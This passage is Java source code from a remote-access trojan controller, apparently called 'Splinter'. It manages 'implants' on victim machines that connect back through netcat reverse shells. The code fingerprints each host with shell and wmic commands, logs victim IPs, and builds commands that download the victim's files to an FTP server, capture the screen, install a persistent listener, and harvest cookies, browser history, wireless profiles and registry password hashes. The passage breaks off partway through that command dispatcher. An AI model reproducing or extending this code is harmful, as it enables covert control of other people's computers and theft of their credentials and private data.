					//interrogate the agent, if we return true... interrogation is complete, and we have confirmed its netcat, and have received all fields pertinent to the query
					if(interrogateNewAgent_NETCAT_NEWER(brSocket))
					{
						//add self to arraylist
						Drivers.alTerminals.add(this);
						
						if(this.i_am_setup_as_relay)
						{
							//not sure what i want to do here just yet
						}
						else//otw, update connected agents as before				
						{
							Drivers.updateConnectedImplants();
							//Drivers.jtblConnectedImplants.updateJTable = true;
						}
						
						dataAcquisitionComplete = true;
						I_have_an_important_message = "";//clear the field to state we're done interrogating
						return true;

					}					
					
					else//we don't know the system connected here
					{
						//unknown agent, but throw an exception to handle it for us
						throw new UnsupportedOperationException ("Unknown Agent Connected");
					}
					
		      	}
		  		
		  		/**********************************************************************************************
		      	 * OLDER CMD PROMPT VERSION "(C) Copyright 1985-2000 Microsoft Corp."
		      	 *********************************************************************************************/
		  		else if(strSecondLine != null && strSecondLine.contains(OLDER_VERSION_OF_CMD_PROMPT_HEADER_STRING))
		      	{
		      		//yup, this appears to be netcat, but running on an older cmd.exe instance.  the full line should actually be similar to "(C) Copyright 1985-2000 Microsoft Corp."
		  			//Drivers.sop("Geez! Older version of Windows Command Prompt Detected! Second line contains search string: " + "\"" + OLDER_VERSION_OF_CMD_PROMPT_HEADER_STRING + "\"." + "- Which appears to match the second line from netcat binding to cmd.exe stating \"(C) Copyright 1985-2000 Microsoft Corp.\"" + " ##>Confidence level for netcat: 50% --> I am skipping the next blank line");
		  			Drivers.sop("-->> Geez! Older version of Windows Command Prompt Detected! -->> Confidence level for netcat: 50% ...");
	      		  					  			
					//interrogate the agent, if we return true... interrogation is complete, and we have confirmed its netcat, and have received all fields pertinent to the query
					if(interrogateNewAgent_NETCAT_OLDER(brSocket))
					{
						//add self to arraylist
						Drivers.alTerminals.add(this);
						
						if(this.i_am_setup_as_relay)
						{
							//not sure what i want to do here just yet
						}
						else//otw, update connected agents as before				
						{
							Drivers.updateConnectedImplants();
							//Drivers.jtblConnectedImplants.updateJTable = true;
						}
						
						dataAcquisitionComplete = true;
						I_have_an_important_message = "";//clear the field to state we're done interrogating
						return true;

					}					
					
					else//we don't know the system connected here
					{
						//unknown agent, but throw an exception to handle it for us
						throw new UnsupportedOperationException ("Unknown Agent Connected");
					}
					
		      	}
		  	
				  
		      	
			}
			
			else//we don't know the system connected here
			{
				//unknown agent, but throw an exception to handle it for us
				throw new UnsupportedOperationException ("Unknown Agent Connected");
			}
			
			/*else if (strFirstLine != null && strFirstLine.contains(OLDER_VERSION_OF_CMD_PROMPT_HEADER_STRING))
			{
				//older version of windows command prompt!!!
				interrogateNewAgent_NETCAT_Older(brSocket);
			}*/
			
			
						
			I_have_an_important_message = "";//clear the field to state we're done interrogating

			if(this.i_am_setup_as_relay)
			{
				//not sure what i want to do here just yet
			}
			else//otw, update connected agents as before				
			{
				if(this.i_am_Beacon_Agent)
				{
					Drivers.updateBeaconImplants();
				}
				else
				{
					Drivers.updateConnectedImplants();
				}
				//Drivers.jtblConnectedImplants.updateJTable = true;
			}
			
			dataAcquisitionComplete = true;
			
			return true;
		}
		
		catch(UnsupportedOperationException uoe)
		{
			//add self to arraylist
			if(Drivers.alTerminals != null)
				Drivers.alTerminals.add(this);
			
			//No biggie, simply alert user we dont know who this is. sad panda!
			Drivers.sop("* * Interrogation to this system failed (Thread ID: " + this.myThread_ID + ").  First Line returned: \"" + strFirstLine + "\" I can not determine the type of agent connected.  However, you might still be able to correspond with the agent!");
			
			//send a blank line to continue the conversation
			pwSocket.println("");
			
			//fall thru to return false;
		}
		
		catch (SocketException se)
		{
			Drivers.sop("Well then!!!  Socket closed abruptly - I am disposing of this thread meant to corresponsd with the implant" );
			continueRun = false;
			
			//remove myself from arraylist		
			Drivers.removeThread(this, this.getId());
								
		}
		
		catch (Exception e)
		{
			Drivers.eop("acquireOverheadData_WINDOWS", this.strMyClassName, e, e.getLocalizedMessage(), true);
			
			//No biggie, simply alert user we dont know who this is. sad panda!
			Drivers.sop("Interrogation to this system failed Thread ID: [" + this.myThread_ID + "].  First Line returned: \"" + strFirstLine + "\" I can not determine the type of agent connected.  However, you might still be able to correspond with the agent!");
			
			//send a blank line to continue the conversation
			pwSocket.println("");
			
		}
		
		dataAcquisitionComplete = true;
		I_have_an_important_message = "";//clear the field to state we're done interrogating

		/*if(this.i_am_setup_as_relay)
		{
			//not sure what i want to do here just yet
		}
		else//otw, update connected agents as before				
		{
			if(this.i_am_Beacon_Agent)
			{
				Drivers.updateBeaconImplants();
			}
			else
			{
				Drivers.updateConnectedImplants();
			}
			//Drivers.jtblConnectedImplants.updateJTable = true;
		}*/
		
		return false;
	}
	  /**
	   * 
	   * VITAL: DO NOT CHANGE THE ORDER COMMANDS ARE ISSUED HERE
	   * IF YOU WANT TO ADD, ADD AT THE END OF THE METHOD!!!!!
	   * 
	   * This Netcat is the newer version of windows command prompt
	   * 
	   * @param brSocket
	   * @return
	   */
	  public boolean interrogateNewAgent_NETCAT_NEWER(BufferedReader brSocket)
	  {
		  
		  try
		  {
			//at this point, we have read the first 2 lines from the agent: "Microsoft windows [Version ...]" and "Copyright (c) 2009 Microsoft Corporation.  All rights reserved."  Read the 3rd line.  This should be blank and continue from there
      		        		
      		//read the next line --> should be blank!
      		String strThirdLine = brSocket.readLine();      		
      		
      		if(strThirdLine != null && strThirdLine.trim().equals(""))
          	{
      			//yup, third line is blank, definitely appears to be nc.exe [LHOST] [PORT] -e cmd.exe
          		//Drivers.sop("Third line is blank as expected when cmd.exe is used with the implant" + " ##>Confidence level for netcat: 75% --> I am reading the final line to determine the netcat execution path");
      			Drivers.sop("-->>> Almost there... Confidence level for netcat: 75% ...");
          		          		    
          		//send a blank line to see the final input provided
          		sendCommand_RAW("");
          		
          		//read the next line --> should be blank!
          		String strFourthLine = brSocket.readLine();          		
          		
          		if(strFourthLine != null && strFourthLine.trim().endsWith(">"))
              	{
          			//as best as we can, this is a netcat machine, indicate accordingly
              		//Drivers.sop("Final line contains search parameter \">\" which appears to be the initial launch directory of of a known implant. I will label this implant netcat" + " ##>Confidence level for netcat: 100% --> I am sending commands to better interrogate the system now...");
          			Drivers.sop("-->>>> OK. So as best as I can tell, this is a netcat agent. I will label this implant netcat" + " -->>>> Confidence level for netcat: 100% -->>>> I am sending commands to better interrogate the system now...");
              		
          			
          			
              		/*******************
              		 * SET IMPLANT ID
              		 *******************/
              		this.myIMPLANT_ID = Driver.IMPLANT_ID_NETCAT;
              		try{this.myImplantName = Driver.ARR_IMPLANT_NAME[myIMPLANT_ID];}catch(Exception e){this.myImplantName = "UNKNOWN";}
              		              		
              		i_am_NETCAT_Agent = true;
              		
              		//done!!!!!
              		//proceed to interrogate the system
              		
              		myImplantInitialLaunchDirectory = strFourthLine;
              		
              		//read final line to clear buffer
              		brSocket.readLine();
              	}
          		
          	}
	      	
			  sendCommand_RAW("hostname");
		      brSocket.readLine();//get rid of echoed command
		      this.myHostName = brSocket.readLine();
		      
		      /*if(myHostName.equals(myImplantInitialLaunchDirectory))
		      {
		    	  //try to send again
		    	  sendCommand_RAW("hostname");
		          this.myHostName = brSocket.readLine();
		      }*/
		     
		      sendCommand_RAW("echo %username%");
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      this.myUserName = brSocket.readLine();      
		      
		
		      sendCommand_RAW("echo %homedrive%");
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      this.myHomeDrive = brSocket.readLine();
		     
		
		      sendCommand_RAW("echo %NUMBER_OF_PROCESSORS%");
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      this.myNumberOfProcessors = brSocket.readLine();
		      
		      sendCommand_RAW("echo %OS%");
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      this.myOS_Type = brSocket.readLine();
		
		      sendCommand_RAW("echo %PROCESSOR_ARCHITECTURE%");
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      this.myProcessorArchitecture = brSocket.readLine();
		
		      sendCommand_RAW("echo %SystemRoot%");
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      this.mySystemRoot = brSocket.readLine();
		
		      sendCommand_RAW("echo %USERDOMAIN%");
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      this.myUserDomain = brSocket.readLine();
		
		      sendCommand_RAW("echo %USERPROFILE%");
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      this.myUserProfile = brSocket.readLine();
		
		      sendCommand_RAW("echo %TEMP%");
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      this.myTempPath = brSocket.readLine();
		
		      sendCommand_RAW("wmic os get caption /value");
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      this.myOS = brSocket.readLine();
		      try { this.myOS = this.myOS.replace("Caption=", ""); }
		      catch (Exception e){}
		      brSocket.readLine();   //clear the buffer after the execution of the above wmic command
		      brSocket.readLine();
		      brSocket.readLine();
		      
		      
		      sendCommand_RAW("wmic os get CSDVersion /value");      
		      brSocket.readLine();
		      brSocket.readLine();   
		      brSocket.readLine();    
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();//issue command
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      this.myServicePack = brSocket.readLine();
		      try { this.myServicePack = this.myServicePack.replace("CSDVersion=", ""); }
		      catch (Exception e)      {      }
		      
		      
		      
		      sendCommand_RAW("wmic os get CountryCode /value");
		      brSocket.readLine();
		      brSocket.readLine();   
		      brSocket.readLine();    
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      this.myCountryCode = brSocket.readLine();
		      try { this.myCountryCode = this.myCountryCode.replace("CountryCode=", ""); }
		      catch (Exception e)      {      }
		      
		      
		      
		      sendCommand_RAW("wmic os get NumberOfUsers /value");
		      brSocket.readLine();
		      brSocket.readLine();   
		      brSocket.readLine();    
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      this.myNumberOfUsers = brSocket.readLine();
		      try { this.myNumberOfUsers = this.myNumberOfUsers.replace("NumberOfUsers=", ""); }
		      catch (Exception e)      {      }
		      
		      
		      
		      
		      sendCommand_RAW("wmic os get Version /value");
		      brSocket.readLine();
		      brSocket.readLine();   
		      brSocket.readLine();    
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      this.myVersionNumber = brSocket.readLine();
		      try { this.myVersionNumber=this.myVersionNumber.replace("Version=", ""); }
		      catch (Exception e)      {      }
		      
		      
		      
		      
		      sendCommand_RAW("wmic os get SerialNumber /value");
		      brSocket.readLine();
		      brSocket.readLine();   
		      brSocket.readLine();    
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      this.mySerialNumber = brSocket.readLine();
		      try { this.mySerialNumber = this.mySerialNumber.replace("SerialNumber=", ""); }
		      catch (Exception e)      {      }
		      
		      sendCommand_RAW("wmic os get OSArchitecture /value");
		      brSocket.readLine();
		      brSocket.readLine();   
		      brSocket.readLine();    
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      this.myOS_Architecture = brSocket.readLine();
		      try { this.myOS_Architecture = this.myOS_Architecture.replace("OSArchitecture=", ""); } catch (Exception e) {}
		      
	      return true;
	    }
	    catch (Exception e)
	    {
	      Drivers.eop("interrogateNewAgent_NETCAT", this.strMyClassName, e, e.getLocalizedMessage(), false);      
	    }
		  
		  return false;
	  }
	
	private boolean deprecated_acquireOverheadData_WINDOWS(BufferedReader brSocket, PrintWriter pwSocket)
	{
		dataAcquisitionComplete = false;
		
		try
		{
			/**
			 * HOSTNAME
			 */
			this.sendCommand_RAW("hostname");
			myHostName = brSocket.readLine();
			
			/**
			 * USER NAME
			 */
			this.sendCommand_RAW("echo %username%");
			myUserName = brSocket.readLine();			
			
			/**
			 * HOME DRIVE
			 */
			this.sendCommand_RAW("echo %homedrive%");
			myHomeDrive = brSocket.readLine();
			
			/**
			 * NUMBER OF PROCESSORS
			 */
			this.sendCommand_RAW("echo %NUMBER_OF_PROCESSORS%");
			myNumberOfProcessors = brSocket.readLine();
			
			
			/**
			 *OS TYPE E.G. WINDOWS NT
			 */
			this.sendCommand_RAW("echo %OS%");
			myOS_Type = brSocket.readLine();
			
			/**
			 * PROCESSOR ARCHITECTURE
			 */
			this.sendCommand_RAW("echo %PROCESSOR_ARCHITECTURE%");
			myProcessorArchitecture = brSocket.readLine();
			
			/**
			 * SYSTEM ROOT
			 */
			this.sendCommand_RAW("echo %SystemRoot%");
			mySystemRoot = brSocket.readLine();
			
			
			/**
			 * USER DOMAIN
			 */
			this.sendCommand_RAW("echo %USERDOMAIN%");
			myUserDomain = brSocket.readLine();
			
			/**
			 * USER PROFILE
			 */
			this.sendCommand_RAW("echo %USERPROFILE%");
			myUserProfile = brSocket.readLine();
			
			/**
			 * PATH TO TEMP
			 */
			this.sendCommand_RAW("echo %TEMP%");
			myTempPath = brSocket.readLine();
			
			
			/**
			 * OS
			 * 
			 * note: I'm gonna skip systeminfo for now... it takes too long
			 * 
			 * however, wmic os get is a beautiful command as well!
			 */
			this.sendCommand_RAW("wmic os get caption /value");
			myOS = brSocket.readLine();
			try{myOS.replace("Caption=", "");}	catch(Exception e){}
			
			/**
			 * SERVICE PACK
			 */
			this.sendCommand_RAW("wmic os get CSDVersion /value");
			myServicePack = brSocket.readLine();
			try{myServicePack.replace("CSDVersion=", "");}	catch(Exception e){}
			
			/**
			 * COUNTRY CODE
			 */
			this.sendCommand_RAW("wmic os get CountryCode /value");
			myCountryCode = brSocket.readLine();
			try{myCountryCode.replace("CountryCode=", "");}	catch(Exception e){}
			
			/**
			 * NUMBER OF USERS
			 */
			this.sendCommand_RAW("wmic os get NumberOfUsers /value");
			myNumberOfUsers = brSocket.readLine();
			try{myNumberOfUsers.replace("NumberOfUsers=", "");}	catch(Exception e){}
			
			/**
			 * VERSION NUMBER
			 */
			this.sendCommand_RAW("wmic os get Version /value");
			myVersionNumber = brSocket.readLine();
			try{myVersionNumber.replace("Version=", "");}	catch(Exception e){}
			
			/**
			 * SERIAL NUMBER
			 */
			this.sendCommand_RAW("wmic os get SerialNumber /value");
			mySerialNumber = brSocket.readLine();
			try{myVersionNumber.replace("SerialNumber=", "");}	catch(Exception e){}
			
			/**
			 * OS ARCHITECTURE
			 */
			this.sendCommand_RAW("wmic os get OSArchitecture /value");
			myOS_Architecture = brSocket.readLine();
			try{myOS_Architecture.replace("OSArchitecture=", "");}	catch(Exception e){}
			
			if(this.i_am_setup_as_relay)
			{
				//not sure what i want to do here just yet
			}
			else//otw, update connected agents as before				
			{
				Drivers.updateConnectedImplants();
				Drivers.jtblConnectedImplants.updateJTable = true;
			}
			
			dataAcquisitionComplete = true;
			return true;
		}
		catch(Exception e)
		{
			Drivers.eop("acquireOverheadData_WINDOWS", strMyClassName, e, e.getLocalizedMessage(), false);
		}
		
		if(this.i_am_setup_as_relay)
		{
			//not sure what i want to do here just yet
		}
		else//otw, update connected agents as before				
		{
			Drivers.updateConnectedImplants();
			//Drivers.jtblConnectedImplants.updateJTable = true;
		}
		
		dataAcquisitionComplete = true;
		return false;
	}
		
	
	public String getThreadID()	{ return "_" +this.getId();}
	
	public String getChatScreenName()
	{
		if(myChatScreenName == null || myChatScreenName.trim().equals(""))
		{
			myChatScreenName = "" + this.getId();					
		}				
		
		return myChatScreenName;
		
	}
	
	public String getChatJListData()
	{
		try
		{						
			return "@"+ getChatScreenName () + "_[" + this.getId() + "]_" +  myVictim_RHOST_IP;
			
		}
		catch(Exception e)
		{
			
		}
		
		return "ID: " + this.getId();
	}
	
	
	
	
	
	public String getJListData()
	{
		try
		{
			if(myOS != null && !myOS.trim().equals(""))
			{
				//return myOS + "_["+ this.getId() + "]_ " + myVictim_RHOST_IP;
				return myOS_Shortcut + "_["+ this.getId() + "]_ " + myVictim_RHOST_IP;
			}
			
			else if(this.myOS_Type != null && !myOS_Type.trim().equals(""))
			{
				return myOS_Type + "_["+ this.getId() + "]_ " + myVictim_RHOST_IP;
			}
			
			return "" + this.getId() + "@" + this.myVictim_RHOST_IP;
			
		}
		catch(Exception e)
		{
			
		}
		
		return "ID: " + this.getId();
	}
	
	public Vector<String> getJTableRowData()
	{
		try	{	vctMyRowData.clear();	} catch(Exception e){}
		
		
		if(myOS == null || myOS.trim().equals(""))
			myOS = myOS_Type;
		
		if(this.myFullGeoData == null || this.myFullGeoData.trim().equals(""))
		{
			myFullGeoData = "UNKNOWN :-(";
		}
		
		/*vctMyRowData.add(I_have_an_important_message);
		vctMyRowData.add(""+this.getId());
		vctMyRowData.add(this.myImplantName);
		vctMyRowData.add(this.myCareOfAddress);
		vctMyRowData.add(this.myImplantInitialLaunchDirectory);
		vctMyRowData.add(myVictim_RHOST_IP);
		vctMyRowData.add(myHostName);
		vctMyRowData.add(myOS);		
		vctMyRowData.add(myOS_Architecture);
		vctMyRowData.add(myServicePack);		
		vctMyRowData.add(myOS_Type);		
		vctMyRowData.add(myUserName);		
		vctMyRowData.add(myNumberOfUsers);
		vctMyRowData.add(mySerialNumber);		
		vctMyRowData.add(myUserDomain);		
		vctMyRowData.add(myProcessorArchitecture);
		vctMyRowData.add(myNumberOfProcessors);
		vctMyRowData.add(myCountryCode);
		vctMyRowData.add(mySystemRoot);
		vctMyRowData.add(myHomeDrive);
		vctMyRowData.add(myVersionNumber);
		vctMyRowData.add(myTempPath);
		vctMyRowData.add(myUserProfile);*/	
		
		if(myImplantInitialLaunchDirectory == null || myImplantInitialLaunchDirectory.trim().equals(""))
		{
			myImplantInitialLaunchDirectory = "." + Driver.fileSeperator;
		}
		else if(!myImplantInitialLaunchDirectory.endsWith(Driver.fileSeperator))
		{
			try
			{
				//take the binary image name: look in the last 5 characters for the presence of a period as the extension!
				if(myImplantInitialLaunchDirectory.substring(myImplantInitialLaunchDirectory.length()-5).contains("."))
				{
					this.myBinaryFileName = myImplantInitialLaunchDirectory.substring(myImplantInitialLaunchDirectory.lastIndexOf(Driver.fileSeperator)+1);
					
					//since we were successful to extract the file name, remove it from the launch path
					myImplantInitialLaunchDirectory = myImplantInitialLaunchDirectory.substring(0,  myImplantInitialLaunchDirectory.lastIndexOf(Driver.fileSeperator));
					
				}
			}catch(Exception e){}
			
			myImplantInitialLaunchDirectory = myImplantInitialLaunchDirectory + Driver.fileSeperator;
			
			//now set the current working directory, and remove the last file separator
			if(this.myImplantInitialLaunchDirectory != null && this.myImplantInitialLaunchDirectory.endsWith(Driver.fileSeperator))
			{
				this.myCurrentWorkingDirectory = myImplantInitialLaunchDirectory.substring(0, myImplantInitialLaunchDirectory.lastIndexOf(Driver.fileSeperator)).trim() + ">" + " ";
			}
			else
			{
				this.myCurrentWorkingDirectory = myImplantInitialLaunchDirectory.trim() + ">" + " ";
			}
									
		}
		
		
		if(this.i_am_Beacon_Agent)
		{
			vctMyRowData.add(myLastConnectionTime);
			vctMyRowData.add(myConfirmationID_Beacon);
			vctMyRowData.add(myBeaconInterval);
			vctMyRowData.add(myApproxTimeTilNextBeacon);
		}
		
		else if(I_am_Disconnected_From_Implant)
		{
			vctMyRowData.add(this.myDisconnectionTime);
		}
		else
		{
			vctMyRowData.add(I_have_an_important_message);
		}
		
		/**
		 * OS SHORTCUT NAME
		 */
		if((myOS_Shortcut == null || myOS_Shortcut.trim().equals("")) && myOS != null)
		{
			if(myOS.trim().toUpperCase().startsWith("MICROSOFT WINDOWS 7 PRO"))
			{
				myOS_Shortcut = "Win 7 Pro";
			}
			else
			{
				myOS_Shortcut = myOS;
			}
		}
		
		vctMyRowData.add(""+this.getId());
		vctMyRowData.add(myFullGeoData);
		vctMyRowData.add(this.myImplantName);
		vctMyRowData.add(this.myCareOfAddress);
		vctMyRowData.add(this.myImplantInitialLaunchDirectory);
		vctMyRowData.add(this.myBinaryFileName);
		vctMyRowData.add(myVictim_RHOST_IP);
		vctMyRowData.add(myHostName);
		vctMyRowData.add(myOS);
		vctMyRowData.add(myOS_Type);
		vctMyRowData.add(myUserName);
		vctMyRowData.add(myUserDomain);
		vctMyRowData.add(myTempPath);
		vctMyRowData.add(myUserProfile);
		vctMyRowData.add(myProcessorArchitecture);
		vctMyRowData.add(myNumberOfProcessors);
		vctMyRowData.add(mySystemRoot);
		vctMyRowData.add(myServicePack);
		vctMyRowData.add(myNumberOfUsers);
		vctMyRowData.add(mySerialNumber);
		vctMyRowData.add(myOS_Architecture);					
		vctMyRowData.add(myCountryCode);
		vctMyRowData.add(myHomeDrive);
		vctMyRowData.add(myVersionNumber);
		
		
		
		
		return vctMyRowData;
	}
	
	/**
	 * Return the Victim Machine connected to the implant 
	 */
	public String getRHOST_IP()	{	return myVictim_RHOST_IP;	}
	
	/**
	 * This is meant to send only one command with only one line as a response back.  If this is the case, then we will put that command here!
	 * 
	 * NOTE: the following may be very susceptible to an overflow if too much data is reported back... sorry, but I'm not going to handle 
	 * that at this time... so beware!!!  you can't say I didn't warn you!
	 * @param cmdToSend
	 * @param broadcastPane
	 * @param privatePane
	 */
	/*public void sendCommand(String cmdToSend, JPanel_TextDisplayPane broadcastPane, JPanel_TextDisplayPane privatePane)//i.e. if we want to say cmd /c ping www.google.com; this raw command is just ping www.google.com
	{
		try
		{
			this.pwOut.println(cmdToSend);
			this.pwOut.flush();
			
			String response = "";
			int val = 0;
			
			while((val = this.brIn.read(arg0)))
			
		}
		catch(Exception e)
		{
			Drivers.eop("Thread ID: " + myID + " sendCommand_RAW", strMyClassName, e, e.getLocalizedMessage(), false);
		}
	}*/
	
	public boolean sendCommand_RAW(String cmdToSend)//i.e. if we want to say cmd /c ping www.google.com; this raw command is just ping www.google.com
	{
		/*******************************************************************************************************************************************************
		 * SOLO, REMEMBER TO EVEN ALLOW NULL OR BLANK STRINGS TO GO FORWARD AS THIS MAY BE USED TO REFRESH THE CURRENT WORKING DIRECTORY OF THE IMPLANTS!!!!!
		 *******************************************************************************************************************************************************/
		
		try
		{
			//Driver.jop("RAW: " + cmdToSend);
			/***
			 * 
			 * TRAP STATEMENTS TO RE-FORMAT COMMANDS ACCORDINGLY (TO ALLOW USER TO ENTER SHORTCUT KEYS WITHOUT WORRYING ABOUT EXACT SYNTAX)
			 * 
			 */
			
			try//if below fails, simply fall through to send it out anyhow!
			{
				try
				{
					Splinter_GUI.jpnlMainController.saveCommandHistory(cmdToSend);
				}catch(Exception f){}
				
				//
				//REJECT CHATE COMMANDS IF THIS IS AN IMPLANT AGENT
				//
				/*try
				{
					if(this.i_am_Splinter_RAT && cmdToSend != null && cmdToSend.trim().startsWith(Driver.CHAT_MESSAGE_BROADCAST))					
					{
						Driver.sop("Rejecting to send chat message to attached implant ID: " + this.getId());
						return true;
					}
				}catch(Exception e){}*/
				
				/*****************************************************
				 * 
				 * 
				 * SHORCUTS
				 * 
				 * 
				 *****************************************************/
				//check if we're sending a shortcut command, if so, we'll have to format specifically based on connected implant
				if(cmdToSend != null && cmdToSend.trim().startsWith(Driver.SHORTCUT_KEY_HEADER))
				{
					//split the internal command
					String [] arrInternalCmds = cmdToSend.split(Driver.INTERNAL_DELIMETER);
					
					//grab the shortcut key
					int shortcutKey = Integer.parseInt(arrInternalCmds[1]);
																				
					//it made it here, the int value is good, check it against our known shortcut vals
					switch(shortcutKey)
					{
						case Driver.SHORTCUT_VALUE_ESTABLISH_PERSISTENT_LISTENER:
						{
							//grab the port
							int PORT = Integer.parseInt(arrInternalCmds[2]);
							
							if(PORT < 1 || PORT > 65534)
							{
								throw new Exception("Port out of range!");
							}
							
							//grab the executable name 
							String listenerBinary_ImageName =  arrInternalCmds[3];
							
							if(listenerBinary_ImageName == null || listenerBinary_ImageName.trim().equals(""))
							{
								throw new Exception("Binary File not specified");
							}
							
							//else, we have all parameters, reformat the string to be sent based on the listener
							cmdToSend = this.reformatShortcut_ESTABLISH_PERSISTEN_LISTENER(cmdToSend, PORT, listenerBinary_ImageName);
							
							break;
						}
						
						case Driver.SHORTCUT_BROWSE_REMOTE_FILE_SYSTEM:
						{
							
							break;
						}
						
						default:
						{
							//unknown key changed, throw internal error
							throw new Exception("Unknown Shortcut Key Specified");
						}
						
					}//end switch on shortcut key value
					
				}//end if for cmdToSend starts with shortcut delimeter
				
				
				/*****************************************************
				 * 
				 * 
				 * DOWNLOAD FILE!
				 * 
				 * 
				 *****************************************************/
				else if(cmdToSend != null && cmdToSend.trim().toLowerCase().startsWith("download"))
				{
					String []arr = cmdToSend.split("\"");
					if(arr.length != 2)
					{
						Driver.sop("download file is in invalid form.  enter download \"[absolute file path on remote machine]\"");
					}
					
					else if(!FTP_ServerSocket.FTP_ServerSocket_Is_Open)
					{
						Driver.jop("ERROR!!! it doesn't appear that the FTP Server is running");
					}
					
					else
					{
						//user should only have to type "download ./fileName" //right now, only allow absolute file paths!
						cmdToSend = Driver.SPLINTER_DELIMETER_INITIAL_REGISTRATION + Driver.delimeter_1 + Driver.SEND_FILE_TO_CONTROLLER + Driver.delimeter_1 + FTP_ServerSocket.FTP_Server_Address + Driver.delimeter_1 + FTP_ServerSocket.PORT + Driver.delimeter_1 + arr[1];
						
					}
					
				}
				
				
				/*****************************************************
				 * 
				 * 
				 * CAPTURE SCREEN!
				 * 
				 * 
				 *****************************************************/
				else if(cmdToSend != null && cmdToSend.trim().toLowerCase().startsWith("capture screen"))
				{										
					cmdToSend = Driver.SPLINTER_DELIMETER_INITIAL_REGISTRATION + Driver.delimeter_1 + Driver.CAPTURE_SCREEN + Driver.delimeter_1 + this.myTempPath + Driver.delimeter_1 + FTP_ServerSocket.FTP_Server_Address + Driver.delimeter_1 + FTP_ServerSocket.PORT;//to delete when done
					
				}
				
				/*****************************************************
				 * 
				 * 
				 * STOP PROCESSES
				 * 
				 * 
				 *****************************************************/
				else if(cmdToSend != null && (cmdToSend.trim().toLowerCase().startsWith("stop process") || cmdToSend.trim().equalsIgnoreCase(Driver.STOP_PROCESS)))
				{										
					cmdToSend = Driver.SPLINTER_DELIMETER_INITIAL_REGISTRATION + Driver.delimeter_1 + Driver.STOP_PROCESS;
					
				}
				
				
								
				
				/*****************************************************
				 * 
				 * 
				 * ENUMERATE SYSTEM
				 * 
				 * 
				 *****************************************************/
				else if(cmdToSend != null && cmdToSend.equalsIgnoreCase(Driver.ENUMERATE_SYSTEM))
				{										
					cmdToSend = Driver.SPLINTER_DELIMETER_INITIAL_REGISTRATION + Driver.delimeter_1 + Driver.ENUMERATE_SYSTEM + Driver.delimeter_1 + this.myTempPath + Driver.delimeter_1 + FTP_ServerSocket.FTP_Server_Address + Driver.delimeter_1 + FTP_ServerSocket.PORT;
					
				}
				
				/*****************************************************
				 * 
				 * 
				 * HARVEST WIRELESS PROFILE
				 * 
				 * 
				 *****************************************************/
				else if(cmdToSend != null && cmdToSend.equalsIgnoreCase(Driver.HARVEST_WIRELESS_PROFILE))
				{										
					cmdToSend = Driver.SPLINTER_DELIMETER_INITIAL_REGISTRATION + Driver.delimeter_1 + Driver.HARVEST_WIRELESS_PROFILE + Driver.delimeter_1 + this.myTempPath + Driver.delimeter_1 + FTP_ServerSocket.FTP_Server_Address + Driver.delimeter_1 + FTP_ServerSocket.PORT;
					
				}
				
				/*****************************************************
				 * 
				 * 
				 * HARVEST COOKIES
				 * 
				 * 
				 *****************************************************/
				else if(cmdToSend != null && cmdToSend.equalsIgnoreCase(Driver.HARVEST_COOKIES))
				{										
					cmdToSend = Driver.SPLINTER_DELIMETER_INITIAL_REGISTRATION + Driver.delimeter_1 + Driver.HARVEST_COOKIES + Driver.delimeter_1 + this.myTempPath + Driver.delimeter_1 + FTP_ServerSocket.FTP_Server_Address + Driver.delimeter_1 + FTP_ServerSocket.PORT;
					
				}
				
				/*****************************************************
				 * 
				 * 
				 * HARVEST BROWSER HISTORY
				 * 
				 * 
				 *****************************************************/
				else if(cmdToSend != null && cmdToSend.equalsIgnoreCase(Driver.HARVEST_BROWSER_HISTORY))
				{										
					cmdToSend = Driver.SPLINTER_DELIMETER_INITIAL_REGISTRATION + Driver.delimeter_1 + Driver.HARVEST_BROWSER_HISTORY + Driver.delimeter_1 + this.myTempPath + Driver.delimeter_1 + FTP_ServerSocket.FTP_Server_Address + Driver.delimeter_1 + FTP_ServerSocket.PORT;
					
				}
				
				/*****************************************************
				 * 
				 * 
				 * HARVEST REGISTRY HASHES
				 * 
				 * 
				 *****************************************************/
				else if(cmdToSend != null && cmdToSend.equalsIgnoreCase(Driver.HARVEST_REGISTRY_HASHES))
				{										
